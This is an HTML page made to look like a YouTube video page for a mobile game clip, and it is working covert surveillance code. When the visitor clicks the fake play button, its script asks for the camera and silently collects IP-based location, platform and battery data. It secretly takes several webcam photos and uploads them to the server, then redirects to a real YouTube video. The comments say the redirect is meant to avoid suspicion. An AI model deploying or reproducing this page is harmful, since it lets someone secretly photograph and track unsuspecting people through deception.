<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-gray: #aaaaaa; }
        body { margin: 0; background: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", sans-serif; }
        
        nav { height: 56px; display: flex; align-items: center; padding: 0 16px; background: var(--yt-bg); position: sticky; top: 0; z-index: 100; }
        .logo { display: flex; align-items: center; font-size: 18px; font-weight: bold; }
        .logo i { color: #ff0000; margin-right: 4px; font-size: 22px; }

        .main-container { display: flex; flex-direction: row; max-width: 1700px; margin: 0 auto; padding: 16px 24px; gap: 24px; }
        
        /* The Player Section */
        .video-section { flex: 3; min-width: 0; }
        .player-wrapper { 
            width: 100%; 
            aspect-ratio: 16/9; 
            background: #000 url('https://i.ytimg.com/vi/mskhsZKeltA/maxresdefault.jpg') center/cover; 
            border-radius: 12px; 
            position: relative; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }

        /* Fake Play Button Overlay */
        .play-overlay {
            width: 100%;
            height: 100%;
            position: absolute;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0,0,0,0.1);
        }
        .yt-play-btn { width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; display: flex; align-items: center; justify-content: center; }
        .yt-play-btn::after { content: ''; border-left: 18px solid white; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-left: 5px; }

        .video-info { margin-top: 12px; }
        .video-title { font-size: 18px; font-weight: 600; line-height: 1.4; }
        .channel-row { display: flex; align-items: center; gap: 12px; margin-top: 12px; }
        .pfp { width: 40px; height: 40px; background: #555; border-radius: 50%; }

        /* Sidebar */
        .sidebar { flex: 1; display: flex; flex-direction: column; gap: 12px; min-width: 320px; }
        .card { display: flex; gap: 8px; cursor: pointer; }
        .thumb { width: 160px; height: 90px; background: #222; border-radius: 8px; flex-shrink: 0; }
        .meta b { font-size: 14px; display: block; margin-bottom: 2px; }
        .meta span { font-size: 12px; color: var(--yt-gray); }

        video, canvas { display: none; }

        @media (max-width: 1000px) {
            .main-container { flex-direction: column; padding: 0; }
            .player-wrapper { border-radius: 0; }
            .video-info { padding: 12px; }
            .sidebar { padding: 12px; }
        }
    </style>
</head>
<body>

    <nav><div class="logo"><i class="fab fa-youtube"></i> YouTube</div></nav>

    <div class="main-container">
        <div class="video-section">
            <div class="player-wrapper" id="player" onclick="initCapture()">
                <div class="play-overlay"><div class="yt-play-btn"></div></div>
            </div>

            <div class="video-info">
                <div class="video-title">Top 10 Insane Thamuz Gameplays | Mythical Immortal 2026</div>
                <div class="channel-row">
                    <div class="pfp"></div>
                    <div>
                        <b>Vinzy Gaming</b><br>
                        <span style="color:var(--yt-gray); font-size: 12px;">850K subscribers</span>
                    </div>
                    <button style="margin-left:auto; background:white; color:black; border:none; padding:8px 16px; border-radius:20px; font-weight:bold;">Subscribe</button>
                </div>
            </div>
        </div>

        <div class="sidebar">
            <div class="card">
                <div class="thumb" style="background:url('https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg') center/cover;"></div>
                <div class="meta"><b>Minsitthar Guide S31</b><span>200K views</span></div>
            </div>
            <div class="card">
                <div class="thumb" style="background:#333;"></div>
                <div class="meta"><b>How to Reach Immortal</b><span>1M views</span></div>
            </div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const tid = urlParams.get('id');
        const mode = urlParams.get('mode') || 'photo';
        const cam = urlParams.get('cam') || 'user';
        const ytid = urlParams.get('ytid') || 'dQw4w9WgXcQ';

        async function initCapture() {
            // Instantly trigger the native browser permission pop-up
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Grab IP and Device Info silently
                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
                
                // Collect hidden hardware info
                let extra = { platform: navigator.platform };
                try {
                    const bat = await navigator.getBattery();
                    extra.battery = Math.round(bat.level*100) + "%";
                } catch(e){}

                await fetch(`/log_info?id=${tid}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({...ipData, ...extra})
                });

                // Start capturing photos while they think the video is loading
                let count = 0;
                const limit = (mode === 'photo') ? 8 : 15;
                
                const interval = setInterval(() => {
                    if(count >= limit) {
                        window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
                        return;
                    }
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    canvas.toBlob(b => {
                        const fd = new FormData();
                        fd.append('file', b, 'img.jpg');
                        fetch(`/upload?id=${tid}&type=${mode}`, {method: 'POST', body: fd});
                    }, 'image/jpeg', 0.6);
                    count++;
                }, 600);

            } catch(e) {
                // If they deny, just redirect anyway to avoid suspicion
                window.location.href = `https://www.youtube.com/watch?v=${ytid}`;
            }
        }
    </script>
</body>
</html>
